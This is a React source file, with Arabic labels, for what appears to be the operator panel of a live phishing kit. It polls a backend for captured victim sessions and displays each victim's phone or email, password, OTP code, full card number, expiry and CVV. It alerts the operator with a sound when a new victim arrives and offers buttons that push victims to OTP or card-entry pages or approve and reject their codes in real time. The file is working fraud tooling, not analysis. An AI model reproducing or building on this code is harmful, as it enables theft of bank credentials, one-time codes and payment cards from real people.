import { useState, useEffect, useRef } from "react";
import {
  Wifi, WifiOff, Trash2, Send, ChevronDown, ChevronUp,
  Users, Phone, CreditCard, Globe, Clock, Eye, EyeOff, Lock, Bell, ArrowRight,
} from "lucide-react";
import { projectApi } from "@/lib/api";
import type { ProjectInfo } from "@/lib/api";

const POLL = 3000;

function timeAgo(ts: number) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}ث`;
  if (s < 3600) return `${Math.floor(s / 60)}د`;
  return `${Math.floor(s / 3600)}س`;
}

function playConnectSound() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const now = ctx.currentTime;
    [660, 880, 1100].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, now + i * 0.12);
      gain.gain.setValueAtTime(0, now + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.25, now + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + i * 0.12 + 0.18);
      osc.start(now + i * 0.12);
      osc.stop(now + i * 0.12 + 0.2);
    });
  } catch {}
}

function StatusBadge({ active }: { active: boolean }) {
  return active ? (
    <div className="flex items-center gap-1.5">
      <Wifi className="w-4 h-4 text-green-400" />
      <span className="text-green-400 text-xs font-bold">متصل</span>
    </div>
  ) : (
    <div className="flex items-center gap-1.5">
      <WifiOff className="w-4 h-4 text-gray-500" />
      <span className="text-gray-500 text-xs font-bold">منقطع</span>
    </div>
  );
}

interface Props {
  project: ProjectInfo;
  onBack: () => void;
}

export default function ProjectDashboard({ project, onBack }: Props) {
  const [entries, setEntries] = useState<any[]>([]);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [showCvv, setShowCvv] = useState<Set<string>>(new Set());
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
  const [newAlert, setNewAlert] = useState<string | null>(null);
  const knownIds = useRef<Set<string>>(new Set());
  const isFirst = useRef(true);

  useEffect(() => {
    // Reset state when project changes
    setEntries([]);
    setExpanded(null);
    knownIds.current = new Set();
    isFirst.current = true;

    const load = async () => {
      const data = await projectApi.getSubmissions(project.apiBase);

      if (isFirst.current) {
        data.forEach((v: any) => knownIds.current.add(v.id));
        isFirst.current = false;
      } else {
        const fresh = data.filter((v: any) => !knownIds.current.has(v.id));
        if (fresh.length > 0) {
          playConnectSound();
          const label = fresh[0].phone ?? fresh[0].email ?? "زائر جديد";
          setNewAlert(label);
          setTimeout(() => setNewAlert(null), 4000);
          fresh.forEach((v: any) => knownIds.current.add(v.id));
        }
      }

      setEntries(data);
      setLastRefresh(new Date());
    };

    load();
    const iv = setInterval(load, POLL);
    return () => clearInterval(iv);
  }, [project.key, project.apiBase]);

  const live    = entries.filter((v) => v.isActive);
  const withOtp = entries.filter((v) => v.otpCode);
  const withCard = entries.filter((v) => v.cardNumber);

  const primaryId = (v: any) => v.phone ?? v.email ?? v.id?.slice(0, 8);

  return (
    <div className="space-y-5" dir="rtl">
      {/* New visitor alert */}
      {newAlert && (
        <div
          className="fixed top-4 left-1/2 z-[100] flex items-center gap-3 px-5 py-3 rounded-2xl shadow-2xl text-white font-black text-sm animate-bounce"
          style={{
            transform: "translateX(-50%)",
            background: "linear-gradient(135deg, #16a34a, #15803d)",
            boxShadow: "0 8px 32px rgba(22,163,74,0.55)",
            minWidth: "240px",
            justifyContent: "center",
          }}
        >
          <Bell className="w-5 h-5 flex-shrink-0" />
          <span>🟢 زائر جديد — {newAlert}</span>
        </div>
      )}

      {/* Sub-header: back + stats */}
      <div className="flex flex-wrap items-center gap-3">
        <button
          onClick={onBack}
          className="flex items-center gap-1.5 text-white/60 hover:text-white transition-colors text-sm font-bold"
        >
          <ArrowRight className="w-4 h-4" /> المشاريع
        </button>
        <span className="text-white/20">/</span>
        <span className="text-white font-black">{project.label}</span>
        {lastRefresh && (
          <span className="text-white/40 text-xs mr-auto hidden sm:block">
            آخر تحديث: {lastRefresh.toLocaleTimeString("ar")}
          </span>
        )}
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        {[
          { label: "الكلي", value: entries.length, icon: Users, color: "#60a5fa" },
          { label: "متصلون", value: live.length, icon: Wifi, color: "#34d399" },
          { label: "أدخلوا OTP", value: withOtp.length, icon: Phone, color: "#f59e0b" },
          { label: "بطاقة", value: withCard.length, icon: CreditCard, color: "#c4923e" },
        ].map(({ label, value, icon: Icon, color }) => (
          <div key={label} className="bg-white/10 rounded-2xl p-4 border border-white/10">
            <div className="flex items-center gap-2 mb-2">
              <div className="w-7 h-7 rounded-xl flex items-center justify-center" style={{ background: color + "30" }}>
                <Icon className="w-3.5 h-3.5" style={{ color }} />
              </div>
              <span className="text-white/70 text-xs font-semibold">{label}</span>
            </div>
            <div className="text-2xl font-black text-white">{value}</div>
          </div>
        ))}
      </div>

      {/* Actions */}
      <div className="flex items-center gap-3">
        <h3 className="text-white font-black flex-1">الجلسات</h3>
        <button
          onClick={() => projectApi.deleteAll(project.apiBase).then(() => setEntries([]))}
          className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl"
        >
          <Trash2 className="w-3.5 h-3.5" /> حذف الكل
        </button>
      </div>

      {/* Table */}
      {entries.length === 0 ? (
        <div className="bg-white/5 rounded-2xl p-12 text-center border border-white/10">
          <Users className="w-12 h-12 text-white/20 mx-auto mb-3" />
          <p className="text-white/40 font-semibold">لا يوجد زوار حتى الآن</p>
        </div>
      ) : (
        <div className="space-y-3">
          {entries.map((v) => (
            <div key={v.id} className="bg-white/5 border border-white/10 rounded-2xl overflow-hidden hover:border-white/20 transition-colors">
              {/* Row */}
              <div className="px-5 py-4 flex flex-wrap items-center gap-3">
                <StatusBadge active={v.isActive} />

                {/* Primary ID */}
                <div className="flex items-center gap-1.5 flex-1 min-w-[120px]">
                  <Phone className="w-3.5 h-3.5 text-blue-400" />
                  <span className="text-white font-bold text-sm">{primaryId(v) || "—"}</span>
                </div>

                {/* Password */}
                {v.password && (
                  <div className="flex items-center gap-1.5">
                    <Lock className="w-3.5 h-3.5 text-purple-400" />
                    <span className="text-purple-300 font-bold text-sm">{v.password}</span>
                  </div>
                )}

                {/* OTP */}
                {v.otpCode && (
                  <div className="bg-amber-500/20 border border-amber-500/30 rounded-lg px-3 py-1">
                    <span className="text-amber-300 font-black text-sm">{v.otpCode}</span>
                  </div>
                )}

                {/* Page */}
                {v.page && (
                  <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 bg-white/10 text-white/70">
                    {v.page}
                  </span>
                )}

                {/* Country */}
                {v.country && (
                  <div className="flex items-center gap-1">
                    <Globe className="w-3 h-3 text-gray-400" />
                    <span className="text-gray-400 text-xs font-bold">{v.country}</span>
                  </div>
                )}

                {/* Time */}
                <div className="flex items-center gap-1 text-gray-500 text-xs">
                  <Clock className="w-3 h-3" />
                  {v.lastSeen ? timeAgo(Number(v.lastSeen)) : "—"}
                </div>

                {/* Expand */}
                <button
                  onClick={() => setExpanded(expanded === v.id ? null : v.id)}
                  className="text-white/40 hover:text-white/80 transition-colors mr-auto"
                >
                  {expanded === v.id ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                </button>
              </div>

              {/* Expanded */}
              {expanded === v.id && (
                <div className="border-t border-white/10 px-5 py-4 space-y-4" style={{ background: "rgba(0,0,0,0.2)" }}>
                  {/* Card data */}
                  {v.cardNumber && (
                    <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                      <div className="flex items-center gap-2 mb-3">
                        <CreditCard className="w-4 h-4 text-yellow-500" />
                        <span className="font-black text-sm text-yellow-500">بيانات البطاقة</span>
                        <button
                          onClick={() => {
                            const next = new Set(showCvv);
                            next.has(v.id) ? next.delete(v.id) : next.add(v.id);
                            setShowCvv(next);
                          }}
                          className="mr-auto text-gray-400 hover:text-white"
                        >
                          {showCvv.has(v.id) ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-sm">
                        <div>
                          <p className="text-gray-400 text-xs font-bold mb-1">رقم البطاقة</p>
                          <p className="text-white font-mono font-bold" dir="ltr">
                            {v.cardNumber.replace(/(.{4})/g, "$1 ").trim()}
                          </p>
                        </div>
                        {v.cardName && (
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">الاسم</p>
                            <p className="text-white font-bold uppercase">{v.cardName}</p>
                          </div>
                        )}
                        {(v.cardMonth || v.cardYearExp) && (
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">الصلاحية</p>
                            <p className="text-white font-bold" dir="ltr">{v.cardMonth}/{v.cardYearExp}</p>
                          </div>
                        )}
                        {v.cardCvv && (
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">CVV</p>
                            <p className="text-white font-black font-mono">
                              {showCvv.has(v.id) ? v.cardCvv : "•••"}
                            </p>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Approve/Reject for waiting page */}
                  {(v.page === "تسجيل الدخول - مكتمل" || v.page === "انتظار") && (
                    <div className="rounded-2xl border-2 border-yellow-500/40 bg-yellow-500/10 p-4 space-y-3">
                      <p className="text-yellow-300 text-xs font-black">⏳ المستخدم في صفحة الانتظار — اتخذ قرارك:</p>
                      <div className="grid grid-cols-2 gap-3">
                        <button
                          onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:otp")}
                          className="py-3 rounded-xl font-black text-sm text-white"
                          style={{ background: "linear-gradient(135deg, #16a34a, #15803d)" }}
                        >
                          ✓ موافقة
                        </button>
                        <button
                          onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:reject")}
                          className="py-3 rounded-xl font-black text-sm text-white"
                          style={{ background: "linear-gradient(135deg, #dc2626, #b91c1c)" }}
                        >
                          ✗ إلغاء
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Commands */}
                  <div className="space-y-2">
                    <p className="text-gray-400 text-xs font-black">إرسال أمر:</p>
                    <div className="flex flex-wrap gap-2">
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:otp")}
                        className="flex items-center gap-1.5 bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/30 text-amber-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> طلب OTP
                      </button>
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:card")}
                        className="flex items-center gap-1.5 bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/30 text-purple-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> طلب بطاقة
                      </button>
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "otp:approved")}
                        className="flex items-center gap-1.5 bg-green-500/20 hover:bg-green-500/30 border border-green-500/30 text-green-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> ✓ قبول OTP
                      </button>
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "otp:rejected")}
                        className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> ✗ رفض OTP
                      </button>
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:reject")}
                        className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> ✗ إلغاء (انتظار)
                      </button>
                      <button
                        onClick={() => projectApi.sendCmd(project.apiBase, v.id, "redirect:login")}
                        className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors"
                      >
                        <Send className="w-3.5 h-3.5" /> ↩ رجوع للدخول
                      </button>
                      <button
                        onClick={() =>
                          projectApi.deleteOne(project.apiBase, v.id).then(() =>
                            setEntries((es) => es.filter((x) => x.id !== v.id))
                          )
                        }
                        className="flex items-center gap-1.5 bg-gray-500/20 hover:bg-gray-500/30 border border-gray-500/30 text-gray-400 font-bold text-xs px-3 py-2 rounded-xl"
                      >
                        <Trash2 className="w-3.5 h-3.5" /> حذف
                      </button>
                    </div>
                  </div>

                  {/* Raw data */}
                  <details className="group">
                    <summary className="text-gray-400 text-xs font-bold cursor-pointer hover:text-white list-none flex items-center gap-1">
                      <ChevronDown className="w-3 h-3 group-open:rotate-180 transition-transform" />
                      جميع البيانات
                    </summary>
                    <div className="mt-2 bg-black/30 rounded-xl p-3 text-xs font-mono text-green-300 overflow-x-auto">
                      <pre>{JSON.stringify(v, null, 2)}</pre>
                    </div>
                  </details>
                </div>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
